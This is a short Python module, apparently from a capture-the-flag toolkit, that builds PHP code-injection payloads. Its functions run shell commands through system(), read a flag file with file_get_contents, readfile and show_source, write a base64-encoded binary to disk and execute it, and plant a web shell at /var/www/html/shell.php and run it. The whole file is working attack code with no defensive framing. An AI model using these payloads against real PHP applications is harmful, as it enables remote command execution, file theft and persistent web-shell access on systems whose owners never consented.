#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import base64


def exp_system(flag="cat /flag"):
    return "system('%s');" % flag


def exp_file_get_contents(flag="/flag"):
    return "echo file_get_contents('%s');" % flag


def exp_readfile(flag="/flag"):
    return "echo readfile('%s');" % flag


def exp_show_source(flag="/flag"):
    return "echo show_source('%s');" % flag


def exp_upload_bin(path="/path", data="test"):
    data = base64.b64encode(data)
    return "file_put_contents('%s',base64_decode('%s'));system('%s');" % (path, data, path)


def exp_upload_shell(path="/var/www/html/shell.php", data="test"):
    data = base64.b64encode(data)
    return "file_put_contents('%s',base64_decode('%s'));system('php %s');" % (path, data, path)
